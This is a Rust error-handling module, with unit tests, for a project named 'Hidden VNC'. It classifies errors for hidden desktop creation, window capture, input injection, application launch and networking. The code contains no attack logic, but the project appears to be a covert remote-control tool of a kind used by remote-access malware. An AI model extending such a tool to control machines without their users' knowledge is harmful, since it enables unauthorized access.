//! Comprehensive error handling framework for Hidden VNC

use thiserror::Error;
use std::fmt;
use log::{error, warn, debug};

/// Result type alias for Hidden VNC operations
pub type Result<T> = std::result::Result<T, HvncError>;

/// Comprehensive error types for Hidden VNC operations
#[derive(Error, Debug)]
pub enum HvncError {
    // Windows API Errors
    #[error("Windows API error: {message} (code: {code:?})")]
    WindowsApi { message: String, code: Option<u32> },
    
    #[error("Windows handle error: {0}")]
    WindowsHandle(String),
    
    #[error("Windows permission error: {0}")]
    WindowsPermission(String),
    
    // Network Errors
    #[error("Network I/O error: {0}")]
    Network(#[from] std::io::Error),
    
    #[error("Connection error: {0}")]
    Connection(String),
    
    #[error("Connection timeout: {0}")]
    ConnectionTimeout(String),
    
    #[error("Connection refused: {0}")]
    ConnectionRefused(String),
    
    #[error("Connection lost: {0}")]
    ConnectionLost(String),
    
    #[error("Protocol error: {0}")]
    Protocol(String),
    
    #[error("Authentication failed: {0}")]
    Authentication(String),
    
    // Image Processing Errors
    #[error("Image processing error: {0}")]
    Image(#[from] image::ImageError),
    
    #[error("Image processing error: {0}")]
    ImageProcessing(String),
    
    #[error("Image format error: {0}")]
    ImageFormat(String),
    
    #[error("Image compression error: {0}")]
    ImageCompression(String),
    
    #[error("Image decompression error: {0}")]
    ImageDecompression(String),
    
    // Serialization Errors
    #[error("JSON serialization error: {0}")]
    Serialization(#[from] serde_json::Error),
    
    #[error("Data format error: {0}")]
    DataFormat(String),
    
    // Application Errors
    #[error("Application not found: {name}")]
    ApplicationNotFound { name: String },
    
    #[error("Application launch failed: {name} - {reason}")]
    ApplicationLaunchFailed { name: String, reason: String },
    
    #[error("Application crashed: {name} (exit code: {exit_code:?})")]
    ApplicationCrashed { name: String, exit_code: Option<u32> },
    
    #[error("Application timeout: {0}")]
    ApplicationTimeout(String),
    
    // Window Management Errors
    #[error("Window not found: {title}")]
    WindowNotFound { title: String },
    
    #[error("Window access denied: {0}")]
    WindowAccessDenied(String),
    
    #[error("Window capture failed: {0}")]
    WindowCaptureFailed(String),
    
    #[error("Window resize failed: {0}")]
    WindowResizeFailed(String),
    
    // Desktop Management Errors
    #[error("Desktop creation failed: {name} - {reason}")]
    DesktopCreation { name: String, reason: String },
    
    #[error("Desktop access failed: {0}")]
    DesktopAccess(String),
    
    #[error("Desktop switch failed: {0}")]
    DesktopSwitch(String),
    
    // Input Handling Errors
    #[error("Invalid input: {0}")]
    InvalidInput(String),
    
    #[error("Input validation failed: {0}")]
    InputValidation(String),
    
    #[error("Input processing failed: {0}")]
    InputProcessing(String),
    
    #[error("Input rate limit exceeded: {0}")]
    InputRateLimit(String),
    
    #[error("Input coordinate out of bounds: ({x}, {y})")]
    InputCoordinateOutOfBounds { x: i32, y: i32 },
    
    #[error("Invalid keycode: {keycode}")]
    InvalidKeycode { keycode: u32 },
    
    // Configuration Errors
    #[error("Configuration error: {0}")]
    Configuration(String),
    
    #[error("Invalid parameter: {parameter} = {value}")]
    InvalidParameter { parameter: String, value: String },
    
    #[error("Missing required parameter: {0}")]
    MissingParameter(String),
    
    // Resource Management Errors
    #[error("Resource allocation failed: {resource} - {reason}")]
    ResourceAllocation { resource: String, reason: String },
    
    #[error("Resource cleanup failed: {0}")]
    ResourceCleanup(String),
    
    #[error("Memory allocation failed: {size} bytes")]
    MemoryAllocation { size: usize },
    
    #[error("File system error: {0}")]
    FileSystem(String),
    
    // Security Errors
    #[error("Security violation: {0}")]
    Security(String),
    
    #[error("Access denied: {0}")]
    AccessDenied(String),
    
    #[error("Permission denied: {operation}")]
    PermissionDenied { operation: String },
    
    // Generic Errors
    #[error("Operation failed: {0}")]
    OperationFailed(String),
    
    #[error("Internal error: {0}")]
    Internal(String),
    
    #[error("Not implemented: {0}")]
    NotImplemented(String),
    
    #[error("Invalid state: {0}")]
    InvalidState(String),
    
    // Multiple errors
    #[error("Multiple errors occurred: {0:?}")]
    Multiple(Vec<HvncError>),
}

impl HvncError {
    /// Create a Windows API error with error code
    pub fn windows_api_with_code(message: impl Into<String>, code: u32) -> Self {
        Self::WindowsApi {
            message: message.into(),
            code: Some(code),
        }
    }
    
    /// Create a Windows API error without error code
    pub fn windows_api(message: impl Into<String>) -> Self {
        Self::WindowsApi {
            message: message.into(),
            code: None,
        }
    }
    
    /// Create an application not found error
    pub fn application_not_found(name: impl Into<String>) -> Self {
        Self::ApplicationNotFound {
            name: name.into(),
        }
    }
    
    /// Create an application launch failed error
    pub fn application_launch_failed(name: impl Into<String>, reason: impl Into<String>) -> Self {
        Self::ApplicationLaunchFailed {
            name: name.into(),
            reason: reason.into(),
        }
    }
    
    /// Create a window not found error
    pub fn window_not_found(title: impl Into<String>) -> Self {
        Self::WindowNotFound {
            title: title.into(),
        }
    }
    
    /// Create a desktop creation error
    pub fn desktop_creation(name: impl Into<String>, reason: impl Into<String>) -> Self {
        Self::DesktopCreation {
            name: name.into(),
            reason: reason.into(),
        }
    }
    
    /// Create an input coordinate out of bounds error
    pub fn input_coordinate_out_of_bounds(x: i32, y: i32) -> Self {
        Self::InputCoordinateOutOfBounds { x, y }
    }
    
    /// Create an invalid keycode error
    pub fn invalid_keycode(keycode: u32) -> Self {
        Self::InvalidKeycode { keycode }
    }
    
    /// Create an invalid parameter error
    pub fn invalid_parameter(parameter: impl Into<String>, value: impl Into<String>) -> Self {
        Self::InvalidParameter {
            parameter: parameter.into(),
            value: value.into(),
        }
    }
    
    /// Create a resource allocation error
    pub fn resource_allocation(resource: impl Into<String>, reason: impl Into<String>) -> Self {
        Self::ResourceAllocation {
            resource: resource.into(),
            reason: reason.into(),
        }
    }
    
    /// Create a permission denied error
    pub fn permission_denied(operation: impl Into<String>) -> Self {
        Self::PermissionDenied {
            operation: operation.into(),
        }
    }
    
    /// Check if this error is recoverable
    pub fn is_recoverable(&self) -> bool {
        match self {
            // Network errors are often recoverable
            Self::Network(_) | Self::ConnectionTimeout(_) | Self::ConnectionLost(_) => true,
            
            // Image processing errors might be recoverable
            Self::Image(_) | Self::ImageFormat(_) | Self::ImageCompression(_) => true,
            
            // Input errors are usually recoverable
            Self::InputValidation(_) | Self::InputProcessing(_) | Self::InputRateLimit(_) => true,
            
            // Application crashes might be recoverable with restart
            Self::ApplicationCrashed { .. } => true,
            
            // Window capture failures might be temporary
            Self::WindowCaptureFailed(_) => true,
            
            // Most other errors are not recoverable
            _ => false,
        }
    }
    
    /// Check if this error should trigger a retry
    pub fn should_retry(&self) -> bool {
        match self {
            Self::ConnectionTimeout(_) | Self::ConnectionLost(_) => true,
            Self::Network(io_err) => {
                matches!(io_err.kind(), 
                    std::io::ErrorKind::TimedOut | 
                    std::io::ErrorKind::Interrupted |
                    std::io::ErrorKind::WouldBlock
                )
            }
            Self::WindowCaptureFailed(_) => true,
            _ => false,
        }
    }
    
    /// Get error severity level
    pub fn severity(&self) -> ErrorSeverity {
        match self {
            // Critical errors that require immediate shutdown
            Self::WindowsPermission(_) | Self::AccessDenied(_) | Self::Security(_) => ErrorSeverity::Critical,
            
            // High severity errors that significantly impact functionality
            Self::DesktopCreation { .. } | Self::ApplicationLaunchFailed { .. } => ErrorSeverity::High,
            
            // Medium severity errors that impact some functionality
            Self::WindowNotFound { .. } | Self::ConnectionRefused(_) => ErrorSeverity::Medium,
            
            // Low severity errors that are recoverable
            Self::InputValidation(_) | Self::ImageFormat(_) => ErrorSeverity::Low,
            
            // Informational errors
            Self::NotImplemented(_) => ErrorSeverity::Info,
            
            // Default to medium
            _ => ErrorSeverity::Medium,
        }
    }
    
    /// Log this error with appropriate level
    pub fn log(&self) {
        match self.severity() {
            ErrorSeverity::Critical => error!("CRITICAL: {}", self),
            ErrorSeverity::High => error!("ERROR: {}", self),
            ErrorSeverity::Medium => warn!("WARNING: {}", self),
            ErrorSeverity::Low => warn!("MINOR: {}", self),
            ErrorSeverity::Info => debug!("INFO: {}", self),
        }
    }
    
    /// Get error category for metrics
    pub fn category(&self) -> ErrorCategory {
        match self {
            Self::WindowsApi { .. } | Self::WindowsHandle(_) | Self::WindowsPermission(_) => ErrorCategory::System,
            Self::Network(_) | Self::ConnectionTimeout(_) | Self::ConnectionRefused(_) | 
            Self::ConnectionLost(_) | Self::Protocol(_) | Self::Authentication(_) => ErrorCategory::Network,
            Self::Image(_) | Self::ImageFormat(_) | Self::ImageCompression(_) | Self::ImageDecompression(_) => ErrorCategory::Image,
            Self::ApplicationNotFound { .. } | Self::ApplicationLaunchFailed { .. } | Self::ApplicationCrashed { .. } => ErrorCategory::Application,
            Self::WindowNotFound { .. } | Self::WindowAccessDenied(_) | Self::WindowCaptureFailed(_) => ErrorCategory::Window,
            Self::DesktopCreation { .. } | Self::DesktopAccess(_) | Self::DesktopSwitch(_) => ErrorCategory::Desktop,
            Self::InputValidation(_) | Self::InputProcessing(_) | Self::InputRateLimit(_) | 
            Self::InputCoordinateOutOfBounds { .. } | Self::InvalidKeycode { .. } => ErrorCategory::Input,
            Self::Configuration(_) | Self::InvalidParameter { .. } | Self::MissingParameter(_) => ErrorCategory::Configuration,
            Self::Security(_) | Self::AccessDenied(_) | Self::PermissionDenied { .. } => ErrorCategory::Security,
            _ => ErrorCategory::General,
        }
    }
}

/// Error severity levels
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, serde::Serialize, serde::Deserialize)]
pub enum ErrorSeverity {
    Info,
    Low,
    Medium,
    High,
    Critical,
}

/// Error categories for metrics and handling
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, serde::Serialize, serde::Deserialize)]
pub enum ErrorCategory {
    System,
    Network,
    Image,
    Application,
    Window,
    Desktop,
    Input,
    Configuration,
    Security,
    General,
}

impl fmt::Display for ErrorCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::System => write!(f, "System"),
            Self::Network => write!(f, "Network"),
            Self::Image => write!(f, "Image"),
            Self::Application => write!(f, "Application"),
            Self::Window => write!(f, "Window"),
            Self::Desktop => write!(f, "Desktop"),
            Self::Input => write!(f, "Input"),
            Self::Configuration => write!(f, "Configuration"),
            Self::Security => write!(f, "Security"),
            Self::General => write!(f, "General"),
        }
    }
}

/// Error context for better debugging
#[derive(Debug, Clone)]
pub struct ErrorContext {
    pub operation: String,
    pub component: String,
    pub additional_info: std::collections::HashMap<String, String>,
}

impl ErrorContext {
    pub fn new(operation: impl Into<String>, component: impl Into<String>) -> Self {
        Self {
            operation: operation.into(),
            component: component.into(),
            additional_info: std::collections::HashMap::new(),
        }
    }
    
    pub fn with_info(mut self, key: impl Into<String>, value: impl Into<String>) -> Self {
        self.additional_info.insert(key.into(), value.into());
        self
    }
}

/// Result extension trait for better error handling
pub trait ResultExt<T> {
    /// Add context to an error
    fn with_context(self, context: ErrorContext) -> Result<T>;
    
    /// Map error to a different type
    fn map_error<F>(self, f: F) -> Result<T>
    where
        F: FnOnce(HvncError) -> HvncError;
    
    /// Log error and continue
    fn log_error(self) -> Result<T>;
    
    /// Convert to option, logging error
    fn ok_or_log(self) -> Option<T>;
}

impl<T> ResultExt<T> for Result<T> {
    fn with_context(self, context: ErrorContext) -> Result<T> {
        self.map_err(|e| {
            error!("Error in {}.{}: {} (context: {:?})", 
                   context.component, context.operation, e, context.additional_info);
            e
        })
    }
    
    fn map_error<F>(self, f: F) -> Result<T>
    where
        F: FnOnce(HvncError) -> HvncError,
    {
        self.map_err(f)
    }
    
    fn log_error(self) -> Result<T> {
        if let Err(ref e) = self {
            e.log();
        }
        self
    }
    
    fn ok_or_log(self) -> Option<T> {
        match self {
            Ok(value) => Some(value),
            Err(e) => {
                e.log();
                None
            }
        }
    }
}#[
cfg(test)]
mod tests {
    use super::*;
    use std::collections::HashMap;
    
    #[test]
    fn test_error_creation_helpers() {
        // Test Windows API error creation
        let error = HvncError::windows_api_with_code("Test error", 123);
        match error {
            HvncError::WindowsApi { message, code } => {
                assert_eq!(message, "Test error");
                assert_eq!(code, Some(123));
            }
            _ => panic!("Expected WindowsApi error"),
        }
        
        let error = HvncError::windows_api("Test error without code");
        match error {
            HvncError::WindowsApi { message, code } => {
                assert_eq!(message, "Test error without code");
                assert_eq!(code, None);
            }
            _ => panic!("Expected WindowsApi error"),
        }
        
        // Test application error creation
        let error = HvncError::application_not_found("notepad.exe");
        match error {
            HvncError::ApplicationNotFound { name } => {
                assert_eq!(name, "notepad.exe");
            }
            _ => panic!("Expected ApplicationNotFound error"),
        }
        
        let error = HvncError::application_launch_failed("notepad.exe", "Permission denied");
        match error {
            HvncError::ApplicationLaunchFailed { name, reason } => {
                assert_eq!(name, "notepad.exe");
                assert_eq!(reason, "Permission denied");
            }
            _ => panic!("Expected ApplicationLaunchFailed error"),
        }
        
        // Test window error creation
        let error = HvncError::window_not_found("Test Window");
        match error {
            HvncError::WindowNotFound { title } => {
                assert_eq!(title, "Test Window");
            }
            _ => panic!("Expected WindowNotFound error"),
        }
        
        // Test desktop error creation
        let error = HvncError::desktop_creation("test_desktop", "Access denied");
        match error {
            HvncError::DesktopCreation { name, reason } => {
                assert_eq!(name, "test_desktop");
                assert_eq!(reason, "Access denied");
            }
            _ => panic!("Expected DesktopCreation error"),
        }
        
        // Test input error creation
        let error = HvncError::input_coordinate_out_of_bounds(1000, 2000);
        match error {
            HvncError::InputCoordinateOutOfBounds { x, y } => {
                assert_eq!(x, 1000);
                assert_eq!(y, 2000);
            }
            _ => panic!("Expected InputCoordinateOutOfBounds error"),
        }
        
        let error = HvncError::invalid_keycode(999);
        match error {
            HvncError::InvalidKeycode { keycode } => {
                assert_eq!(keycode, 999);
            }
            _ => panic!("Expected InvalidKeycode error"),
        }
        
        // Test parameter error creation
        let error = HvncError::invalid_parameter("quality", "150");
        match error {
            HvncError::InvalidParameter { parameter, value } => {
                assert_eq!(parameter, "quality");
                assert_eq!(value, "150");
            }
            _ => panic!("Expected InvalidParameter error"),
        }
        
        // Test resource error creation
        let error = HvncError::resource_allocation("memory", "Out of memory");
        match error {
            HvncError::ResourceAllocation { resource, reason } => {
                assert_eq!(resource, "memory");
                assert_eq!(reason, "Out of memory");
            }
            _ => panic!("Expected ResourceAllocation error"),
        }
        
        // Test permission error creation
        let error = HvncError::permission_denied("file access");
        match error {
            HvncError::PermissionDenied { operation } => {
                assert_eq!(operation, "file access");
            }
            _ => panic!("Expected PermissionDenied error"),
        }
    }
    
    #[test]
    fn test_error_recoverability() {
        // Test recoverable errors
        let recoverable_errors = vec![
            HvncError::Network(std::io::Error::new(std::io::ErrorKind::TimedOut, "timeout")),
            HvncError::ConnectionTimeout("test".to_string()),
            HvncError::ConnectionLost("test".to_string()),
            HvncError::Image(image::ImageError::Limits(image::error::LimitError::from_kind(
                image::error::LimitErrorKind::DimensionError
            ))),
            HvncError::ImageFormat("test".to_string()),
            HvncError::ImageCompression("test".to_string()),
            HvncError::InputValidation("test".to_string()),
            HvncError::InputProcessing("test".to_string()),
            HvncError::InputRateLimit("test".to_string()),
            HvncError::ApplicationCrashed { name: "test".to_string(), exit_code: Some(1) },
            HvncError::WindowCaptureFailed("test".to_string()),
        ];
        
        for error in recoverable_errors {
            assert!(error.is_recoverable(), "Error should be recoverable: {:?}", error);
        }
        
        // Test non-recoverable errors
        let non_recoverable_errors = vec![
            HvncError::WindowsPermission("test".to_string()),
            HvncError::AccessDenied("test".to_string()),
            HvncError::Security("test".to_string()),
            HvncError::DesktopCreation { name: "test".to_string(), reason: "test".to_string() },
            HvncError::Configuration("test".to_string()),
        ];
        
        for error in non_recoverable_errors {
            assert!(!error.is_recoverable(), "Error should not be recoverable: {:?}", error);
        }
    }
    
    #[test]
    fn test_error_retry_logic() {
        // Test errors that should trigger retry
        let retry_errors = vec![
            HvncError::ConnectionTimeout("test".to_string()),
            HvncError::ConnectionLost("test".to_string()),
            HvncError::Network(std::io::Error::new(std::io::ErrorKind::TimedOut, "timeout")),
            HvncError::Network(std::io::Error::new(std::io::ErrorKind::Interrupted, "interrupted")),
            HvncError::Network(std::io::Error::new(std::io::ErrorKind::WouldBlock, "would block")),
            HvncError::WindowCaptureFailed("test".to_string()),
        ];
        
        for error in retry_errors {
            assert!(error.should_retry(), "Error should trigger retry: {:?}", error);
        }
        
        // Test errors that should not trigger retry
        let no_retry_errors = vec![
            HvncError::AccessDenied("test".to_string()),
            HvncError::Configuration("test".to_string()),
            HvncError::InvalidParameter { parameter: "test".to_string(), value: "test".to_string() },
            HvncError::Network(std::io::Error::new(std::io::ErrorKind::PermissionDenied, "permission")),
        ];
        
        for error in no_retry_errors {
            assert!(!error.should_retry(), "Error should not trigger retry: {:?}", error);
        }
    }
    
    #[test]
    fn test_error_severity() {
        // Test critical errors
        let critical_errors = vec![
            HvncError::WindowsPermission("test".to_string()),
            HvncError::AccessDenied("test".to_string()),
            HvncError::Security("test".to_string()),
        ];
        
        for error in critical_errors {
            assert_eq!(error.severity(), ErrorSeverity::Critical, "Error should be critical: {:?}", error);
        }
        
        // Test high severity errors
        let high_errors = vec![
            HvncError::DesktopCreation { name: "test".to_string(), reason: "test".to_string() },
            HvncError::ApplicationLaunchFailed { name: "test".to_string(), reason: "test".to_string() },
        ];
        
        for error in high_errors {
            assert_eq!(error.severity(), ErrorSeverity::High, "Error should be high severity: {:?}", error);
        }
        
        // Test medium severity errors
        let medium_errors = vec![
            HvncError::WindowNotFound { title: "test".to_string() },
            HvncError::ConnectionRefused("test".to_string()),
        ];
        
        for error in medium_errors {
            assert_eq!(error.severity(), ErrorSeverity::Medium, "Error should be medium severity: {:?}", error);
        }
        
        // Test low severity errors
        let low_errors = vec![
            HvncError::InputValidation("test".to_string()),
            HvncError::ImageFormat("test".to_string()),
        ];
        
        for error in low_errors {
            assert_eq!(error.severity(), ErrorSeverity::Low, "Error should be low severity: {:?}", error);
        }
        
        // Test info errors
        let info_errors = vec![
            HvncError::NotImplemented("test".to_string()),
        ];
        
        for error in info_errors {
            assert_eq!(error.severity(), ErrorSeverity::Info, "Error should be info severity: {:?}", error);
        }
    }
    
    #[test]
    fn test_error_categories() {
        // Test system errors
        let system_errors = vec![
            HvncError::WindowsApi { message: "test".to_string(), code: None },
            HvncError::WindowsHandle("test".to_string()),
            HvncError::WindowsPermission("test".to_string()),
        ];
        
        for error in system_errors {
            assert_eq!(error.category(), ErrorCategory::System, "Error should be system category: {:?}", error);
        }
        
        // Test network errors
        let network_errors = vec![
            HvncError::Network(std::io::Error::new(std::io::ErrorKind::TimedOut, "timeout")),
            HvncError::ConnectionTimeout("test".to_string()),
            HvncError::ConnectionRefused("test".to_string()),
            HvncError::ConnectionLost("test".to_string()),
            HvncError::Protocol("test".to_string()),
            HvncError::Authentication("test".to_string()),
        ];
        
        for error in network_errors {
            assert_eq!(error.category(), ErrorCategory::Network, "Error should be network category: {:?}", error);
        }
        
        // Test image errors
        let image_errors = vec![
            HvncError::Image(image::ImageError::Limits(image::error::LimitError::from_kind(
                image::error::LimitErrorKind::DimensionError
            ))),
            HvncError::ImageFormat("test".to_string()),
            HvncError::ImageCompression("test".to_string()),
            HvncError::ImageDecompression("test".to_string()),
        ];
        
        for error in image_errors {
            assert_eq!(error.category(), ErrorCategory::Image, "Error should be image category: {:?}", error);
        }
        
        // Test application errors
        let application_errors = vec![
            HvncError::ApplicationNotFound { name: "test".to_string() },
            HvncError::ApplicationLaunchFailed { name: "test".to_string(), reason: "test".to_string() },
            HvncError::ApplicationCrashed { name: "test".to_string(), exit_code: Some(1) },
        ];
        
        for error in application_errors {
            assert_eq!(error.category(), ErrorCategory::Application, "Error should be application category: {:?}", error);
        }
        
        // Test window errors
        let window_errors = vec![
            HvncError::WindowNotFound { title: "test".to_string() },
            HvncError::WindowAccessDenied("test".to_string()),
            HvncError::WindowCaptureFailed("test".to_string()),
        ];
        
        for error in window_errors {
            assert_eq!(error.category(), ErrorCategory::Window, "Error should be window category: {:?}", error);
        }
        
        // Test desktop errors
        let desktop_errors = vec![
            HvncError::DesktopCreation { name: "test".to_string(), reason: "test".to_string() },
            HvncError::DesktopAccess("test".to_string()),
            HvncError::DesktopSwitch("test".to_string()),
        ];
        
        for error in desktop_errors {
            assert_eq!(error.category(), ErrorCategory::Desktop, "Error should be desktop category: {:?}", error);
        }
        
        // Test input errors
        let input_errors = vec![
            HvncError::InputValidation("test".to_string()),
            HvncError::InputProcessing("test".to_string()),
            HvncError::InputRateLimit("test".to_string()),
            HvncError::InputCoordinateOutOfBounds { x: 0, y: 0 },
            HvncError::InvalidKeycode { keycode: 999 },
        ];
        
        for error in input_errors {
            assert_eq!(error.category(), ErrorCategory::Input, "Error should be input category: {:?}", error);
        }
        
        // Test configuration errors
        let config_errors = vec![
            HvncError::Configuration("test".to_string()),
            HvncError::InvalidParameter { parameter: "test".to_string(), value: "test".to_string() },
            HvncError::MissingParameter("test".to_string()),
        ];
        
        for error in config_errors {
            assert_eq!(error.category(), ErrorCategory::Configuration, "Error should be configuration category: {:?}", error);
        }
        
        // Test security errors
        let security_errors = vec![
            HvncError::Security("test".to_string()),
            HvncError::AccessDenied("test".to_string()),
            HvncError::PermissionDenied { operation: "test".to_string() },
        ];
        
        for error in security_errors {
            assert_eq!(error.category(), ErrorCategory::Security, "Error should be security category: {:?}", error);
        }
    }
    
    #[test]
    fn test_error_context() {
        let mut context = ErrorContext::new("test_operation", "test_component");
        assert_eq!(context.operation, "test_operation");
        assert_eq!(context.component, "test_component");
        assert!(context.additional_info.is_empty());
        
        context = context.with_info("key1", "value1").with_info("key2", "value2");
        assert_eq!(context.additional_info.len(), 2);
        assert_eq!(context.additional_info.get("key1"), Some(&"value1".to_string()));
        assert_eq!(context.additional_info.get("key2"), Some(&"value2".to_string()));
    }
    
    #[test]
    fn test_result_extensions() {
        // Test successful result
        let result: Result<i32> = Ok(42);
        let context = ErrorContext::new("test", "test");
        let result_with_context = result.with_context(context);
        assert!(result_with_context.is_ok());
        assert_eq!(result_with_context.unwrap(), 42);
        
        // Test error mapping
        let result: Result<i32> = Err(HvncError::Configuration("test".to_string()));
        let mapped_result = result.map_error(|_| HvncError::Internal("mapped".to_string()));
        assert!(mapped_result.is_err());
        match mapped_result.unwrap_err() {
            HvncError::Internal(msg) => assert_eq!(msg, "mapped"),
            _ => panic!("Expected Internal error"),
        }
        
        // Test ok_or_log
        let success_result: Result<i32> = Ok(42);
        let option = success_result.ok_or_log();
        assert_eq!(option, Some(42));
        
        let error_result: Result<i32> = Err(HvncError::Configuration("test".to_string()));
        let option = error_result.ok_or_log();
        assert_eq!(option, None);
    }
    
    #[test]
    fn test_error_severity_ordering() {
        assert!(ErrorSeverity::Info < ErrorSeverity::Low);
        assert!(ErrorSeverity::Low < ErrorSeverity::Medium);
        assert!(ErrorSeverity::Medium < ErrorSeverity::High);
        assert!(ErrorSeverity::High < ErrorSeverity::Critical);
    }
    
    #[test]
    fn test_error_category_display() {
        assert_eq!(ErrorCategory::System.to_string(), "System");
        assert_eq!(ErrorCategory::Network.to_string(), "Network");
        assert_eq!(ErrorCategory::Image.to_string(), "Image");
        assert_eq!(ErrorCategory::Application.to_string(), "Application");
        assert_eq!(ErrorCategory::Window.to_string(), "Window");
        assert_eq!(ErrorCategory::Desktop.to_string(), "Desktop");
        assert_eq!(ErrorCategory::Input.to_string(), "Input");
        assert_eq!(ErrorCategory::Configuration.to_string(), "Configuration");
        assert_eq!(ErrorCategory::Security.to_string(), "Security");
        assert_eq!(ErrorCategory::General.to_string(), "General");
    }
    
    #[test]
    fn test_error_display_formatting() {
        // Test various error display formats
        let error = HvncError::windows_api_with_code("Test error", 123);
        let display = format!("{}", error);
        assert!(display.contains("Windows API error"));
        assert!(display.contains("Test error"));
        assert!(display.contains("123"));
        
        let error = HvncError::application_not_found("notepad.exe");
        let display = format!("{}", error);
        assert!(display.contains("Application not found"));
        assert!(display.contains("notepad.exe"));
        
        let error = HvncError::input_coordinate_out_of_bounds(100, 200);
        let display = format!("{}", error);
        assert!(display.contains("Input coordinate out of bounds"));
        assert!(display.contains("100"));
        assert!(display.contains("200"));
    }
}